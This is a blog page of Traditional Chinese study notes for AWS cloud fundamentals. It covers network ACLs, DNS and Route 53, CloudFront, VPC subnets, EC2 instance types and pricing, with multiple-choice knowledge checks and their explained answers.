<p>  <img src="/img/AWS34_26.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>設定</p>
<ul>
<li>預設情況<ul>
<li>拒絕所有傳入流量，允許所有傳出流量</li>
</ul>
</li>
<li>自訂規則<ul>
<li>設定允許或拒絕特定流量</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="知識檢測"><a href="#知識檢測" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><p>下列哪個敘述與 AWS 帳戶的預設網路存取控制清單 (ACL) 最相符？</p>
<ul>
<li><input disabled="" type="checkbox"> 它無狀態，且會拒絕所有傳入和傳出流量。</li>
<li><input disabled="" type="checkbox"> 它有狀態，且會允許所有傳入和傳出流量。</li>
<li><input checked="" disabled="" type="checkbox"> 它無狀態，且會允許所有傳入和傳出流量。</li>
</ul>
<blockquote>
<p>網路存取控制清單 (ACL) 會執行<strong>無狀態</strong>封包篩選。這項功能會忽略所有規則，一律檢查往來跨越子網路邊界的傳入和傳出封包。</p>
<p>每個 AWS 帳戶都包含一個預設網路 ACL。設定 VPC 時，您可以使用帳戶的預設網路 ACL，也可以建立自訂網路 ACL。</p>
<p>根據預設，帳戶的預設網路 ACL 會允許所有傳入和傳出流量，但您可以自行新增規則來加以修改。如使用自訂網路 ACL，則所有傳入和傳出流量都會遭到拒絕，除非您新增規則，指定應允許哪些流量。此外，所有網路 ACL 都具備一項明確拒絕規則。此規則可確保在封包未符合清單上任何其他規則的情況下，會拒絕該封包。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 它有狀態，且會拒絕所有傳入和傳出流量。</li>
</ul>
<h2 id="全球網路"><a href="#全球網路" class="headerlink" title="全球網路"></a><strong>全球網路</strong></h2><ul>
<li>客戶與 AWS 基礎設施互動<ul>
<li><p>DNS (Domain Name System)</p>
<p>  <img src="/img/AWS34_27.png" alt="Untitled"></p>
<p>  用戶端連線至尋找網域的 DNS 解析器。解析器將請求轉送至 DNS 伺服器，該伺服器則將 IP 地址傳回解析器。</p>
<ul>
<li>定義<ul>
<li>將網站名稱翻譯成 IP 地址的服務</li>
</ul>
</li>
<li>路由流程<ul>
<li>客戶輸入網址至瀏覽器</li>
<li>瀏覽器聯絡 DNS 解析器</li>
<li>解析器向 DNS 伺服器查詢 IP 地址</li>
<li>公司 DNS 伺服器提供 IP 地址</li>
</ul>
</li>
</ul>
</li>
<li><p>Amazon Route 53</p>
<ul>
<li>功能<ul>
<li>提供 DNS 服務</li>
<li>管理網域名稱的 DNS 記錄</li>
</ul>
</li>
<li>路由政策<ul>
<li><p>Latency Based Routing</p>
<ul>
<li>基於最低延遲路由流量</li>
</ul>
</li>
<li><p>地理位置 DNS</p>
<ul>
<li>根據客戶所在地區路由流量</li>
</ul>
</li>
<li><p>地理鄰近度</p>
<ul>
<li>將流量路由至最近的節點</li>
</ul>
</li>
<li><p>加權輪詢算法</p>
<ul>
<li>根據權重分配流量到不同的端點</li>
</ul>
</li>
<li><p><strong>Amazon Route 53 和 Amazon CloudFront 交付內容</strong></p>
<p>  <img src="/img/AWS34_28.png" alt="Untitled"></p>
<ul>
<li>AnyCompany 的應用程式在數個 Amazon EC2 執行個體上執行</li>
<li>執行個體所在的 Auto Scaling 群組連接到 Application Load Balancer<ul>
<li>客戶前往 AnyCompany 的網站以便請求應用程式的資料</li>
<li>Amazon Route 53 使用 DNS 解析來識別 AnyCompany.com 的相應 IP 地址 192.0.2.0。這個資訊會再傳回給客戶</li>
<li>客戶的請求會透過 Amazon CloudFront 傳送到最近的節點</li>
<li>Amazon CloudFront 會連接到 Application Load Balancer，後者會將傳入的封包傳送到 Amazon EC2 執行個體</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>CDN (Content Delivery Network)</p>
<ul>
<li>定義<ul>
<li>協助加快將網站資產交付給客戶的網路</li>
</ul>
</li>
<li>Amazon CloudFront<ul>
<li>功能<ul>
<li>部署靜態網路資產到全球節點，提高存取速度</li>
</ul>
</li>
<li>運作方式<ul>
<li>客戶存取網站</li>
<li>請求透過 CloudFront 網路</li>
<li>CloudFront 將請求路由到最近的節點</li>
<li>節點從遠端伺服器擷取資料</li>
<li>資料傳送至客戶，減少延遲</li>
</ul>
</li>
</ul>
</li>
<li>使用案例<ul>
<li>北美洲使用者存取網站<ul>
<li>資產部署到北美洲節點</li>
</ul>
</li>
<li>愛爾蘭使用者存取網站<ul>
<li>資產部署到愛爾蘭節點</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="知識檢測-1"><a href="#知識檢測-1" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><p>以下哪個敘述與 DNS 解析最相符？</p>
<ul>
<li><input disabled="" type="checkbox"> 在自己定義的虛擬網路中啟動資源</li>
<li><input disabled="" type="checkbox"> 在世界各地的節點儲存本機的內容副本</li>
<li><input disabled="" type="checkbox"> 將 VPC 連接到網際網路</li>
<li><input checked="" disabled="" type="checkbox"> 將網域名稱轉譯為 IP 位址</li>
</ul>
<blockquote>
<p>舉例來說，如果您想前往 AnyCompany 的網站，於是在 PC 輸入網域名稱，這個請求就會傳送到 DNS 伺服器。接下來，DNS 伺服器會向 Web 伺服器要求與 AnyCompany 的網站對應的 IP 位址。Web 伺服器的回應方式是提供某公司網站的 IP 位址 192.0.2.0。</p>
</blockquote>
<h2 id="單元-4-總結"><a href="#單元-4-總結" class="headerlink" title="單元 4 總結"></a><strong>單元 4 總結</strong></h2><ul>
<li><p>AWS 網路連結</p>
<ul>
<li>概述<ul>
<li>將網路連結簡化並抽象化，只需回答「有誰能與彼此互相溝通」這個問題</li>
</ul>
</li>
<li>VPC (Virtual Private Cloud)<ul>
<li>隔離工作負載的方式</li>
</ul>
</li>
<li>網路安全<ul>
<li>閘道</li>
<li>網路 ACL</li>
<li>安全群組</li>
<li>阻止顛覆性攻擊的方式</li>
</ul>
</li>
<li>VPN 和 Direct Connect<ul>
<li>連線到 AWS 的方式</li>
</ul>
</li>
<li>加密<ul>
<li>在一般網際網路上進行加密</li>
<li>建立專屬光纖網路安全管道</li>
</ul>
</li>
<li>AWS 全球網路<ul>
<li>使用節點提供的全球網路</li>
</ul>
</li>
<li>Route 53<ul>
<li>用於 DNS 的服務</li>
</ul>
</li>
<li>CloudFront<ul>
<li>就近快取內容給消費者的服務</li>
</ul>
</li>
</ul>
<h3 id="單元-4-測驗"><a href="#單元-4-測驗" class="headerlink" title="單元 4 測驗"></a><strong>單元 4 測驗</strong></h3><p>  您的公司有一款應用程式使用 Amazon EC2 執行個體來執行客戶使用的網站，並使用 Amazon RDS 資料庫執行個體來存放客戶的個人資訊。根據最佳實務，開發人員應該如何設定 VPC？</p>
<ul>
<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體放在私有子網路中，將 Amazon RDS 資料庫執行個體放在公有子網路中。</li>
<li><input checked="" disabled="" type="checkbox"> 將 Amazon EC2 執行個體放在公有子網路中，將 Amazon RDS 資料庫執行個體放在私有子網路中。</li>
</ul>
<blockquote>
<p>正確答案是<strong>將 Amazon EC2 執行個體放在公有子網路中，將 Amazon RDS 資料庫執行個體放在私有子網路中</strong>。</p>
<p><strong>子網路</strong>是 VPC 的一個區段，您可以根據安全或操作需求將資源分組到區段中。子網路可以設為公有或私有。</p>
<p>公有子網路包含需要開放存取的資源，例如線上商店的網站。</p>
<p>私有子網路包含只能透過私有網路存取的資源，例如含有客戶個人資訊和訂單紀錄的資料庫。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體和 Amazon RDS 資料庫執行個體都放在公有子網路中。</li>
<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體和 Amazon RDS 資料庫執行個體都放在私有子網路中。</li>
</ul>
<p>  以下哪個元件可用於建立公司的資料中心和 AWS 之間的私有專用連線？</p>
<ul>
<li><input disabled="" type="checkbox"> 私有子網路</li>
<li><input disabled="" type="checkbox"> DNS</li>
<li><input checked="" disabled="" type="checkbox"> AWS Direct Connect</li>
</ul>
<blockquote>
<p>其他答案皆不正確，因為：</p>
<ul>
<li>私有子網路是 VPC 的一個區段，您可以將只能透過私有網路存取的資源分組到這些區段中。儘管私有，但它不會用於建立資料中心和 AWS 之間的連線。</li>
<li>DNS 全稱為網域名稱系統，它是用於與 IP 地址的網域名稱比對的目錄。</li>
<li>虛擬私有閘道可讓您在 VPC 和私有網路 (例如公司的資料中心) 之間建立 VPN 連線。雖然此連線為私有且經過加密，但是會流經公有網際網路，而不是經由專用連線。</li>
</ul>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 虛擬私有閘道</li>
</ul>
<p>  以下哪個敘述與安全群組最相符？</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 根據預設，它們具有狀態，且會拒絕所有傳入流量。</li>
</ul>
<blockquote>
<p>安全群組是具狀態的。也就是說，它們在評估執行個體的新請求時，會運用先前的流量模式和流動情形。</p>
<p>根據預設，安全群組會拒絕所有傳入流量，但您可以新增自訂規則，以便符合自己的操作和安全需求。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 根據預設，它們具有狀態，且會允許所有傳入流量。</li>
<li><input disabled="" type="checkbox"> 根據預設，它們沒有狀態，且會拒絕所有傳入流量。</li>
<li><input disabled="" type="checkbox"> 根據預設，它們沒有狀態，且會允許所有傳入流量。</li>
</ul>
<p>  以下哪個元件使用於將 VPC 連接到網際網路？</p>
<ul>
<li><input disabled="" type="checkbox"> 公有子網路</li>
<li><input disabled="" type="checkbox"> 節點</li>
<li><input disabled="" type="checkbox"> 安全群組</li>
<li><input checked="" disabled="" type="checkbox"> 網際網路閘道</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>公有子網路是 VPC 的區段，包含公有資源。</li>
<li>節點是 Amazon CloudFront 用來存放內容快取副本的地點，藉此加速向客戶交付內容。</li>
<li>安全群組是一種虛擬防火牆，可控制 Amazon EC2 執行個體的傳入和傳出流量。</li>
</ul>
</blockquote>
<p>  以下哪種服務可用於管理網域名稱的 DNS 記錄？</p>
<ul>
<li><input disabled="" type="checkbox"> Amazon Virtual Private Cloud</li>
<li><input disabled="" type="checkbox"> AWS Direct Connect</li>
<li><input disabled="" type="checkbox"> Amazon CloudFront</li>
<li><input checked="" disabled="" type="checkbox"> Amazon Route 53</li>
</ul>
<blockquote>
<p>Amazon Route 53 是一種 DNS Web 服務。它提供可靠的方式，讓開發人員和企業將終端使用者路由到託管於 AWS 的網際網路應用程式。</p>
<p>Route 53 還具備能力管理網域名稱的 DNS 紀錄。您可以轉移其他網域註冊機構管理的現有網域名稱下存在的 DNS 記錄。您也可以直接在 Route 53 中註冊新的網域名稱。</p>
<p>其他選項皆不正確，因為：</p>
<ul>
<li>Amazon Virtual Private Cloud (Amazon VPC) 這項服務可讓您佈建 AWS Cloud 的分隔區段。在這個分隔區段中，您可以在自己定義的虛擬網路中啟動資源。</li>
<li>AWS Direct Connect 這項服務可讓您在資料中心和 VPC 之間建立專用私有連線。</li>
<li>Amazon CloudFront 是一種內容交付服務。這種服務使用節點網路來快取內容，並將內容交付給世界各地的客戶。</li>
</ul>
</blockquote>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS12" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS12/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.073Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS12/">
        AWS Basic Architecture 1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="單元一簡介"><a href="#單元一簡介" class="headerlink" title="單元一簡介"></a>單元一簡介</h1><ol>
<li><p><strong>AWS 提供廣泛的服務</strong>：AWS 提供各種服務，從基本的運算、儲存和網路安全工具，到複雜的解決方案，如區塊鏈、機器學習、人工智慧和機器人開發平台。</p>
</li>
<li><p><strong>用戶端-伺服器模型</strong>：現代運算通常使用<strong>用戶端-伺服器</strong>模型。</p>
<p> <img src="/img/AWS12.png" alt="Untitled"></p>
<ul>
<li>用戶端可以是 Web 瀏覽器或桌面應用程式，向伺服器提出請求</li>
<li>伺服器可以是虛擬伺服器，如 Amazon EC2。</li>
</ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用戶端                          伺服器</span><br><span class="line">(客人)                         (咖啡師)</span><br><span class="line"></span><br><span class="line">    |                            | </span><br><span class="line">    |提出點咖啡的請求 -----------&gt;  |</span><br><span class="line">    |&lt;------ 檢查請求是否合法----   |</span><br><span class="line">    |                           |</span><br><span class="line">    |准備支付                     |</span><br><span class="line">    |------------&gt;確認支付是否成功  |</span><br><span class="line">    |&lt;------準備咖啡------------- |</span><br><span class="line">    |                           |</span><br><span class="line">    |收到咖啡 &lt;-----------咖啡完成  |</span><br><span class="line"></span><br><span class="line">------------------------------------------</span><br><span class="line">在此流程圖中：</span><br><span class="line"></span><br><span class="line">- 用戶端代表了咖啡店的客人，他們提出點咖啡的請求。</span><br><span class="line">- 伺服器代表了咖啡店的咖啡師，他們負責準備咖啡。</span><br><span class="line">- 箭頭表示信息的流動方向，從用戶端到伺服器，以及從伺服器到用戶端。</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>按需支付</strong>：AWS 的支付模式是按需支付，不需要預先支付任何費用，也不必擔心容量限制。只有在需要時才支付費用，並且可以隨時釋放不再需要的資源。</p>
</li>
<li><p><strong>雲端運算基礎概念</strong>：AWS 的基礎概念包括按需計費、彈性伸縮、安全性、高可用性等。這些概念有助於業務有效地運行在雲端平台上。</p>
</li>
<li><p><strong>教育和支援</strong>：AWS 提供廣泛的教育和支援，讓用戶能夠瞭解和利用 AWS 的各種功能和服務，包括培訓課程、文件和社群支援。</p>
</li>
</ol>
<h2 id="雲端運算"><a href="#雲端運算" class="headerlink" title="雲端運算"></a>雲端運算</h2><ul>
<li>雲端運算的核心概念<ul>
<li>雲端運算是透過網際網路提供的 IT 資源隨需交付<ul>
<li>隨需交付<ul>
<li>AWS 可在有需求時立即提供所需資源</li>
<li>無需事先告知何時需要資源</li>
<li>靈活地啟用和停用資源，隨即停止付費</li>
<li>非常靈活，無法透過自行管理資料中心實現的靈活性</li>
</ul>
</li>
</ul>
</li>
<li>IT 資源的概念<ul>
<li>重要性<ul>
<li>AWS 的目標是協助用戶專注於突顯業務獨特性</li>
</ul>
</li>
<li>無差異的繁重工作<ul>
<li>AWS 針對重複性高、耗時的任務提供協助</li>
<li>用戶可以透過安全的網頁主控台或程式設計方式存取資源</li>
</ul>
</li>
<li>實支實付的定價<ul>
<li>用戶只需支付所使用的資源費用</li>
<li>無需預付費用或額外合約</li>
</ul>
</li>
</ul>
</li>
<li>雲端運算的部署模型<ul>
<li>雲端<ul>
<li>在雲端中執行完整的應用程式</li>
<li>遷移現有應用程式或建立新應用程式</li>
</ul>
</li>
<li>內部部署<ul>
<li>使用虛擬化和資源管理工具部署資源</li>
<li>提高資源使用率</li>
</ul>
</li>
<li>混合<ul>
<li>將雲端資源連接到內部部署基礎設施</li>
<li>整合雲端資源與傳統 IT 應用程式</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>雲端運算的優勢<ul>
<li>將預付成本轉成變動成本<ul>
<li>省去投資於資料中心和伺服器的預先投資</li>
</ul>
</li>
<li>停止將資金花費在執行和維護資料中心上<ul>
<li>減少在基礎設施管理上的時間和金錢</li>
</ul>
</li>
<li>無需猜測容量<ul>
<li>不必預先評估需要多少基礎設施容量</li>
<li>可根據需求動態調整資源</li>
</ul>
</li>
<li>受益於大範圍規模經濟<ul>
<li>可以享有更低的成本</li>
</ul>
</li>
<li>提升速度和敏捷性<ul>
<li>可以更快速地開發和部署應用程式</li>
</ul>
</li>
<li>快速進入全球市場<ul>
<li>可以迅速向全球部署應用程式並降低延遲</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="單元一測驗"><a href="#單元一測驗" class="headerlink" title="單元一測驗"></a>單元一測驗</h3><p>回答本測驗中的問題，測試您對本單元中某些主要概念的理解程度。</p>
<ol>
<li>什麼是雲端運算？</li>
</ol>
<ul>
<li><p><input disabled="" type="checkbox"> 
將儲存在桌上型電腦和行動裝置中的檔案加以備份，以防資料遺失</p>
</li>
<li><p><input disabled="" type="checkbox"> 
部署連線至內部部署基礎設施的應用程式</p>
</li>
<li><p><input disabled="" type="checkbox"> 
無需管理或佈建伺服器即可執行程式碼</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
透過網路以實支實付定價方式收費的 IT 資源和應用程式隨需交付</p>
<p>  其他回答選項皆不正確，因為：</p>
<blockquote>
<p>檔案雖然可以備份到雲端，但第一個選項並未完整解釋雲端運算。</p>
<p>部署連接到內部部署基礎設施的應用程式是混合雲端部署的使用案例。別忘了，雲端運算還有雲端和內部部署 (或私有雲端) 的部署模型。</p>
<p>AWS Lambda 是一項 AWS 服務，可讓您在不需要管理或佈建伺服器的情況下執行程式碼。這項描述並未完整說明雲端運算</p>
</blockquote>
</li>
</ul>
<ol>
<li>內部部署的別稱是什麼？</li>
</ol>
<ul>
<li><p><input checked="" disabled="" type="checkbox"> 
私有雲端部署</p>
<p>  其他回答選項皆不正確，因為：</p>
<blockquote>
<p>雲端應用程式會完全部署在雲端中，不會有以內部部署方式執行的任何部分。</p>
<p>混合部署會連接起雲端資源與雲端外現有資源 (例如內部部署資源) 之間的基礎設施和應用程式。不過，混合部署並不等同於內部部署，因為它需使用到位於雲端的資源。</p>
<p>AWS 雲端提供三種雲端部署模型：雲端、混合和內部部署。 AWS 雲端不等同於內部部署本身。</p>
</blockquote>
</li>
<li><p><input disabled="" type="checkbox"> 
雲端應用程式</p>
</li>
<li><p><input disabled="" type="checkbox"> 
混合部署</p>
</li>
<li><p><input disabled="" type="checkbox"> 
AWS 雲端</p>
</li>
</ul>
<ol>
<li>雲端運算的規模為何有助於節省成本？</li>
</ol>
<ul>
<li><p><input disabled="" type="checkbox"> 
您不必在使用技術資源之前預先進行投資。</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
大量客戶的雲端用量經過彙總後，會產生較低廉的實支實付價格。</p>
<p>  其他回答選項皆不正確，因為：</p>
<blockquote>
<p>您不必在使用技術資源之前預先進行投資，請參考<em>將預付成本轉成變動成本</em>。</p>
<p>隨需存取服務可避免容量過多或受限，請參考<em>無需猜測容量</em>。</p>
<p>可快速向客戶部署應用程式部署，並降低延遲，請參考<em>快速進入全球市場</em>。</p>
</blockquote>
</li>
<li><p><input disabled="" type="checkbox"> 
隨需存取服務有助於防止容量過剩或受限。</p>
</li>
<li><p><input disabled="" type="checkbox"> 
您可以快速向客戶部署應用程式，並且降低延遲。</p>
</li>
</ul>
<h1 id="單元二簡介"><a href="#單元二簡介" class="headerlink" title="單元二簡介"></a>單元二簡介</h1><p><img src="/img/AWS12_1.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> AWS (Amazon Web Services)</span><br><span class="line">  |</span><br><span class="line">  |- Amazon Elastic Compute Cloud (Amazon EC2)</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 靈活、符合成本效益、快速的運算</span><br><span class="line">  |   |- 虛擬化技術管理的實體主機電腦上執行</span><br><span class="line">  |   |   |- 會與多個其他執行個體(虛擬機器)一起共用主機</span><br><span class="line">  |   |   |-  Hypervisor </span><br><span class="line">  |   |   |   |- 虛擬機器之間分享基礎實體資源</span><br><span class="line">  |   |   |   |- 共用基礎硬體的概念稱為多租用戶(由AWS管理)</span><br><span class="line">  |   |- 代替內部部署資源</span><br><span class="line">  |   |- 啟動 EC2 執行個體的流程</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 1. 啟動</span><br><span class="line">  |   |   |   |- 選擇基本組態範本、執行個體類型</span><br><span class="line">  |   |   |   |   |- 包括作業系統、應用程式伺服器或應用程式</span><br><span class="line">  |   |   |   |- 指定安全設定</span><br><span class="line">  |   |   |   |   |- 控制可往來流經執行個體的網路流量</span><br><span class="line">  |   |   |- 2. 連接</span><br><span class="line">  |   |   |   |- 多種方式連接到執行個體</span><br><span class="line">  |   |   |   |   |- 程式和應用程式有多種不同方法來直接連接到執行個體並交換資料</span><br><span class="line">  |   |   |   |   |- 使用者登入並存取電腦桌面來連接執行個體</span><br><span class="line">  |   |   |- 3. 使用</span><br><span class="line">  |   |       |- 在執行個體中執行命令、安裝軟體等</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 執行個體的靈活性和控制性</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 選擇作業系統和執行軟體</span><br><span class="line">  |   |   |- <span class="strong">**垂直擴展**</span>執行個體(擴大或縮小)</span><br><span class="line">  |   |   |- 控制網路連結層面</span><br><span class="line">  |   |   |   |   |- 決定伺服器可以接收請求的類型、是否可公開/私有方式存取</span><br><span class="line">  |</span><br><span class="line">  |- 優點</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 將預付成本轉成變動成本</span><br><span class="line">  |   |- 停止將資金花費在執行和維護資料中心上</span><br><span class="line">  |   |- 無需猜測容量</span><br><span class="line">  |   |- 受益於大範圍規模經濟</span><br><span class="line">  |   |- 提升速度和敏捷性</span><br><span class="line">  |   |- 快速進入全球市場</span><br><span class="line">  |</span><br><span class="line">  |- 雲端運算的部署模型</span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 以雲端為基礎進行部屬</span></span><br><span class="line"><span class="code">      |   |- 在雲端中執行完整的應用程式</span></span><br><span class="line"><span class="code">      |   |- 將現有的應用程式遷移至雲端</span></span><br><span class="line"><span class="code">      |   |- 在雲端中設計和建立新的應用程式</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 內部部屬之部署方式</span></span><br><span class="line"><span class="code">      |   |- 透過虛擬化和資源管理工具部署資源</span></span><br><span class="line"><span class="code">      |   |- 運用應用程式管理和虛擬化技術提高資源使用率</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 混合部署</span></span><br><span class="line"><span class="code">          |- 將雲端資源連接到內部部署基礎設施</span></span><br><span class="line"><span class="code">          |- 整合雲端資源與傳統 IT 應用程式</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<ul>
<li>當虛擬機器共用主機的資源時，Hypervisor 會負責將虛擬機器彼此分隔</li>
<li>這表示 EC2 執行個體很安全。即使它們會共用資源，某個 EC2 執行個體並無法感知到該主機上是否存在任何其他 EC2 執行個體</li>
<li>它們會彼此分隔，並受到保護</li>
<li>CaaS 運算即服務</li>
</ul>
<h2 id="Amazon-EC2-執行個體類型"><a href="#Amazon-EC2-執行個體類型" class="headerlink" title="Amazon EC2 執行個體類型"></a><strong>Amazon EC2 執行個體類型</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon EC2 執行個體類型</span><br><span class="line">│</span><br><span class="line">├── 一般用途執行個體</span><br><span class="line">│   ├── 平衡運算、記憶體、網路資源</span><br><span class="line">│   ├── 適用於各種工作負載，如應用程式伺服器、遊戲伺服器等</span><br><span class="line">│</span><br><span class="line">├── 運算最佳化執行個體</span><br><span class="line">│   ├── 專為運算密集型任務設計</span><br><span class="line">│   ├── 適用於高效能 Web 伺服器、運算密集的應用程式伺服器等</span><br><span class="line">│   ├── 批次處理工作負載</span><br><span class="line">│</span><br><span class="line">├── 記憶體最佳化執行個體</span><br><span class="line">│   ├── 專為處理大型資料集的工作負載設計</span><br><span class="line">│   ├── 適合記憶體密集型任務</span><br><span class="line">│   ├── 適用於高效能資料庫、即時處理大量資料的工作負載等</span><br><span class="line">│</span><br><span class="line">├── 加速運算執行個體</span><br><span class="line">│   ├── 使用硬體加速器提高效率</span><br><span class="line">│   ├── 用於浮點數計算、圖形處理，或是資料模式比對</span><br><span class="line">│   ├── 適用於圖形應用程式、遊戲串流等</span><br><span class="line">│   ├── 採用硬體加速器</span><br><span class="line">│</span><br><span class="line">└── 儲存最佳化執行個體</span><br><span class="line"><span class="code">    ├── 專為處理超大型資料集的存取工作負載設計</span></span><br><span class="line"><span class="code">    ├── 適用於分散式檔案系統、資料倉儲應用程式等</span></span><br><span class="line"><span class="code">    ├── 需要對本機儲存資料進行高效能處理的工作負載</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h3 id="知識檢測"><a href="#知識檢測" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
<li>什麼 Amazon EC2 執行個體類型適合資料倉儲應用？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input checked="" disabled="" type="checkbox"> 儲存最佳化</li>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<ol>
<li>哪一種 Amazon EC2 執行個體類型可以取得運算、記憶體和連網資源的平衡？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
<li><input checked="" disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<ol>
<li>什麼 Amazon EC2 執行個體類型最適合高效能資料庫？</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<ol>
<li>哪一種 Amazon EC2 執行個體類型提供高效能處理器？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input checked="" disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<h2 id="Amazon-EC2-定價"><a href="#Amazon-EC2-定價" class="headerlink" title="Amazon EC2 定價"></a><strong>Amazon EC2 定價</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon EC2 定價選項</span><br><span class="line">├── 隨需定價</span><br><span class="line">│   ├── 執行個體執行的時間長度付費</span><br><span class="line">│   ├── 適用於不可中斷的短期不定期工作負載</span><br><span class="line">│   ├── 無需預付成本或最低合約</span><br><span class="line">│   ├── 適用於開發、測試應用程式等使用模式無法預測的情況</span><br><span class="line">├── 預留執行個體</span><br><span class="line">│   ├── 標準預留執行個體</span><br><span class="line">│   │   ├── 適用於穩定狀態的應用程式</span><br><span class="line">│   │   ├── 提前承諾一定的用量以獲得折扣</span><br><span class="line">│   │   ├── 可選擇 EC2 執行個體類型、大小、作業系統、租用等</span><br><span class="line">│   ├── 可轉換預留執行個體</span><br><span class="line">│       ├── 適用於需要在不同區域或不同執行個體類型中執行的情況</span><br><span class="line">│       ├── 提供更高折扣並具有更大靈活性</span><br><span class="line">├── EC2 執行個體 Savings Plans</span><br><span class="line">│   ├── 提供折扣，最多可節省72%，需承諾一定的用量和時間</span><br><span class="line">│   ├── 無需指定 EC2 執行個體類型和大小、作業系統和租用</span><br><span class="line">│   ├── 對執行個體系列和區域做出 1 年期或 3 年期的每小時支出承諾，可降低 EC2 執行個體成本</span><br><span class="line">│   ├── 定價方式也適用於 AWS Fargate 和 AWS Lambda 用量</span><br><span class="line">├── Spot 執行個體</span><br><span class="line">│   ├── 適用於彈性或可承受中斷的工作負載</span><br><span class="line">│   ├── 最高可節省 90% 成本，但需承受執行個體可能中斷的風險</span><br><span class="line">│   |   ├── 容量不再可用或 Spot 執行個體的需求增加，個體可能會中斷</span><br><span class="line">├── 專用主機</span><br><span class="line"><span class="code">    ├── 提供完全專用的實體伺服器</span></span><br><span class="line"><span class="code">    ├── 可用於維持授權合規、購買隨需的專用主機和專用主機保留</span></span><br><span class="line"><span class="code">    ├── 專用主機價格最高</span></span><br></pre></td></tr></table></figure>

<h3 id="知識檢測-1"><a href="#知識檢測-1" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
<li>您指定多個 EC2 執行個體在一個區域中執行特定作業系統、執行個體系列和大小及租用時，哪個 Amazon EC2 定價選項可提供折扣？</li>
</ol>
<ul>
<li><p><input disabled="" type="checkbox"> 
可轉換預留執行個體</p>
</li>
<li><p><input disabled="" type="checkbox"> 
EC2 執行個體 Savings Plans</p>
</li>
<li><p><input disabled="" type="checkbox"> 
Spot 執行個體</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
標準預留執行個體</p>
<blockquote>
<p>標準預留執行個體要求您指定：</p>
<ul>
<li>執行個體系列和大小</li>
<li>平台說明</li>
<li>租用</li>
<li>區域</li>
</ul>
<p>您指定數量的 EC2 執行個體涵蓋 1 年期或 3 年期</p>
</blockquote>
</li>
</ul>
<p>您對執行個體系列和區域做出 1 年期或 3 年期限的每小時支出承諾時，哪個 Amazon EC2 定價選項可提供折扣？</p>
<ul>
<li><input disabled="" type="checkbox"> 隨需</li>
<li><input checked="" disabled="" type="checkbox"> EC2 執行個體 Savings Plans</li>
<li><input disabled="" type="checkbox"> Spot 執行個體</li>
<li><input disabled="" type="checkbox"> 預留執行個體</li>
</ul>
